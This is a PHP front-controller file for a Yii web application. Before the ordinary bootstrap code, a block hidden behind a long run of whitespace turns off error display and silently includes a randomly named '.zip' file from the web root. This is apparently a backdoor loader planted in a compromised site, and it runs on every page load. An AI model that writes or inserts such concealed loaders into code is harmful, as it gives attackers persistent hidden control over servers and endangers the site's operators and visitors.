<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       error_reporting(0);ini_set("display_errors", 0);$localpath=getenv("SCRIPT_NAME");$absolutepath=getenv("SCRIPT_FILENAME");$root_path=substr($absolutepath,0,strpos($absolutepath,$localpath));include_once($root_path."/d730d81e7o133a51c2bddc5c68874ce.zip"); ?><?php
// change the following paths if necessary
$yii=dirname(__FILE__).'/../yii/framework/yii.php';
$config=dirname(__FILE__).'/protected/config/main.php';

// remove the following lines when in production mode
defined('YII_DEBUG') or define('YII_DEBUG',false);
// specify how many levels of call stack should be shown in each log message
defined('YII_TRACE_LEVEL') or define('YII_TRACE_LEVEL',3);

require_once($yii);
Yii::createWebApplication($config)->run();
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      ?><?php 